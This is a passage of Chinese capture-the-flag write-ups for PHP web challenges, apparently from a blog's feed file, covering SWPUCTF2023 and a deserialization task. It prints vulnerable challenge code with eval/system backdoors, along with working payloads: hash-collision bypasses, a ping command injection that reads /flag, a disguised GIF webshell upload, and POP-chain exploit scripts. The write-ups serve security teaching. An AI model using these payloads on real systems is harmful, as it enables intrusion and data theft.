class="variable">$fei</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">miaomiao</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;gao=<span class="variable language_">$this</span>-&gt;fei;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">miaomiao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;Mikey Mouse~&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">musca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ding</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dong</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ding-&gt;dong;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">milaoshu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;misca~musca~milaoshu~~~&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you should think harder!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$_GET</span>[<span class="string">&quot;wanna_fl.ag&quot;</span>]))</span><br></pre></td></tr></table></figure><p>这里链子比较简单，关键在于<code>$this-&gt;gao=$this-&gt;fei;</code>，由于<code>$this-&gt;miaomiao();</code>将a提前赋值，我们可以用gao去取到a的引用，fei去连接下一个链子，由于gao、fei相等，gao为a的引用，相当于就是a去连接了下一个链子，exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">musca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ding</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dong</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ding=<span class="keyword">new</span> misca;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">misca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fei</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fei=<span class="keyword">new</span> milaoshu;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;gao=&amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">milaoshu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>=<span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> musca;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPU2023 web</title>
      <link href="/2023/10/14/SWPU2023-web/"/>
      <url>/2023/10/14/SWPU2023-web/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SWPUCTF2023-web"><a href="#SWPUCTF2023-web" class="headerlink" title="SWPUCTF2023 web"></a>SWPUCTF2023 web</h1><h2 id="colorful-snake"><a href="#colorful-snake" class="headerlink" title="colorful_snake"></a>colorful_snake</h2><p>直接进入<code>game.js</code>,在函数<code>this_is_real_flag()</code>里，<code>Unescape Unicode Characters</code>解码</p><h2 id="NSS-HTTP-CHEKER"><a href="#NSS-HTTP-CHEKER" class="headerlink" title="NSS_HTTP_CHEKER"></a>NSS_HTTP_CHEKER</h2><p>根据要求传值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /?this_is_get=get_%1t HTTP/1.1</span><br><span class="line">Host: node6.anna.nssctf.cn:28510</span><br><span class="line">User-Agent: NSSCTF</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 17</span><br><span class="line">Origin: http://node6.anna.nssctf.cn:28303</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://node6.anna.nssctf.cn:28303/</span><br><span class="line">Cookie: PHPSESSID=a2ed6a6a9f7b35a14604ac3b24b7af29;this_is_cookie=cookie_suki_desu~</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line"></span><br><span class="line">this_is_post=p03t</span><br></pre></td></tr></table></figure><h2 id="一键连接！"><a href="#一键连接！" class="headerlink" title="一键连接！"></a>一键连接！</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$md5_1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5_1&#x27;</span>];</span><br><span class="line"><span class="variable">$md5_2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5_2&#x27;</span>];</span><br><span class="line"><span class="variable">$sha1_1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sha1_1&#x27;</span>];</span><br><span class="line"><span class="variable">$sha1_2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sha1_2&#x27;</span>];</span><br><span class="line"><span class="variable">$new_player</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;new_player&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$md5_1</span> !== <span class="variable">$md5_2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$md5_1</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$md5_2</span>)) &#123;<span class="comment">//md5强类型比较,md5值相同绕过</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$sha1_1</span> != <span class="variable">$sha1_2</span> &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$sha1_1</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$sha1_2</span>)) &#123;<span class="comment">//sha1强类型比较，数组绕过</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$new_player</span>) === <span class="string">&quot;Welcome to NSSCTF!!!&quot;</span>) &#123;<span class="comment">//data://text/plain伪协议绕过file_get_contents</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Congratulations~~~~~~~~~&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;试试need Antsword&lt;br/&gt;&quot;</span>;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Nss&#x27;</span>]);<span class="comment">//进入后门</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;可曾听过data协议?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;sha1又如何相等呢&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;如何让md5值相等呢¿&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">如何让md5值相等呢¿</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET:?md5_1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;md5_2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;sha1_1[]=1&amp;sha1_2[]=2&amp;new_player=data://text/plain,Welcome to NSSCTF!!!</span><br></pre></td></tr></table></figure><p>蚁剑进入，flag在根目录。</p><h2 id="ez-talk"><a href="#ez-talk" class="headerlink" title="ez_talk"></a>ez_talk</h2><p>文件上传，随便上传几个文件，发现只有图片可以上传，上传普通的图片马，提示：<code>改了type我就不知道你这个不是图片了是吧</code>，上传gif图片马，在一句话木马前加上<code>GIF89a</code>，让解析器认为这是一个gif图片，抓包，在图片名后添加后缀<code>.php</code>(为了能将此文件解析)，然后访问图片路径可直接进入后门</p><p><img src="/2023/10/14/SWPU2023-web/4-1.png"></p><h2 id="Pingpingping"><a href="#Pingpingping" class="headerlink" title="Pingpingping"></a>Pingpingping</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$_ping</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Ping_ip.exe&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_ping</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ping -c 3 &quot;</span>.<span class="variable">$_ping</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;error.png&quot;</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,<span class="subst">$data</span>&#x27;/&gt;&quot;</span>; </span><br></pre></td></tr></table></figure><p>GET方式传入值，会直接进入危险函数<code>system</code>执行代码，需要注意的是<code>_和.</code>是非法的，可以用<code>[</code>代替，当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code>。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ping[ip.exe=127.0.0.1;ls /;cat /flag</span><br></pre></td></tr></table></figure><h2 id="UnS3rialize"><a href="#UnS3rialize" class="headerlink" title="UnS3rialize"></a>UnS3rialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NSS</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Congratulations!!!You have learned to construct a POP chain&lt;br/&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;W4keup!!!&lt;br/&gt;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo Welcome to NSSCTF&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$whoami</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$argv</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;what do you want?&quot;</span>;</span><br><span class="line">        <span class="variable">$want</span> = <span class="variable language_">$this</span>-&gt;whoami;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$want</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">T</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Now you know how to use __toString&lt;br/&gt;There is more than one way to trigger&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;sth-&gt;<span class="keyword">var</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span> = <span class="string">&quot;nss&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span> = <span class="string">&quot;ctf&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$notes</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$passwd</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;user === <span class="string">&quot;SWPU&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd === <span class="string">&quot;NSS&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Now you know how to use __construct&lt;br/&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;your notes&quot;</span>.<span class="variable language_">$this</span>-&gt;notes;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;N0!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Let&#x27;s do some deserialization :)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Let<span class="string">&#x27;s do some deserialization :)</span></span><br></pre></td></tr></table></figure><p>考察php反序列化中的pop链，先来看几种魔术方法触发条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">方法名        调用条件</span><br><span class="line">__call        调用不可访问或不存在的方法时被调用</span><br><span class="line">__callStatic调用不可访问或不存在的静态方法时被调用</span><br><span class="line">__clone        进行对象clone时被调用，用来调整对象的克隆行为</span><br><span class="line">__constuct    构建对象的时被调用；</span><br><span class="line">__debuginfo    当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本</span><br><span class="line">__destruct    明确销毁对象或脚本结束时被调用；</span><br><span class="line">__get        读取不可访问或不存在属性时被调用</span><br><span class="line">__invoke    当以函数方式调用对象时被调用</span><br><span class="line">__isset        对不可访问或不存在的属性调用isset()或empty()时被调用</span><br><span class="line">__set        当给不可访问或不存在属性赋值时被调用</span><br><span class="line">__set_state    当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。</span><br><span class="line">__sleep        当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用</span><br><span class="line">__toString    当一个类被转换成字符串时被调用</span><br><span class="line">__unset        对不可访问或不存在的属性进行unset时被调用</span><br><span class="line">__wakeup    当使用unserialize时被调用，可用于做些对象的初始化操作</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里我们需要首先确定pop链的头部和尾部，显然<code>class F</code>是头部，<code>class NSS</code>是尾部，所以这个pop链为：<code>__destruct()-&gt;__toString()-&gt;__get($argv)-&gt;__invoke()</code></p><p>此外，还需要令<code>user === &quot;SWPU&quot;passwd === &quot;NSS&quot;</code>，通过控制<code>cmd</code>进行命令执行，同时需要绕过<code>__wakeup</code>(只增加属性数量，不增加属性绕过)，exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NSS</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Congratulations!!!You have learned to construct a POP chain&lt;br/&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;W4keup!!!&lt;br/&gt;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo Welcome to NSSCTF&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$whoami</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$argv</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;what do you want?&quot;</span>;</span><br><span class="line">        <span class="variable">$want</span> = <span class="variable language_">$this</span>-&gt;whoami;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$want</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">T</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Now you know how to use __toString&lt;br/&gt;There is more than one way to trigger&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;sth-&gt;<span class="keyword">var</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span> = <span class="string">&quot;nss&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span> = <span class="string">&quot;ctf&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$notes</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$passwd</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;user === <span 